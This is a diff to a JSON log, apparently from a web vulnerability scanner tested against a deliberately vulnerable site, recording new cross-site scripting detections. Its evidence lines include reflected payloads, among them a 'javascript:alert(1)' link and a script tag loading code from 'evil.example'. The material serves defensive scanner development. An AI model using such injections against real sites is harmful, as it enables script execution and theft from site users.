@@ -18,6 +18,27 @@
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: GET /tags/tag/svg?q=%3Csvg%20src=x%3E returns <svg src=\"x\"></svg>; svg route scan findings 88→93 (+svg live+route + tags-injection-route); benchmark 6/6 maintained"
     },
+    {
+      "source": "discovery:public-firing-range.appspot.com",
+      "slug": "firing-range-tags-tag-a-href-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /tags/tag/a/href?q=%3Ca%20href=javascript:alert(1)%3E returns <a href=\"javascript:alert(1)\"></a>; a/href route scan findings 88→94 (+a-href live+route oracles); benchmark juice-shop-staging 31 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:public-firing-range.appspot.com",
+      "slug": "firing-range-tags-tag-script-src-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /tags/tag/script/src?q=%3Cscript%20src=//evil.example/x.js%3E returns <script src=\"//evil.example/x.js\"></script>; script/src route scan findings 88→94 (+script-src live+route oracles); benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:public-firing-range.appspot.com",
+      "slug": "firing-range-tags-tag-div-style-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /tags/tag/div/style?q=%3Cdiv%20style=background:red%3E returns <div style=\"background:red\"></div>; div/style route scan findings 88→94 (+div-style live+route oracles); benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:public-firing-range.appspot.com",
+      "slug": "firing-range-hsts-preload-missing-live-oracle",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: GET /stricttransportsecurity/hsts_preload_missing returns strict-transport-security: max-age=63072000; includeSubDomains (no preload); hsts_preload_missing route scan findings 82→89 (+preload-missing live+route oracles); benchmark juice-shop-staging 31 findings 6/6 maintained"
     },
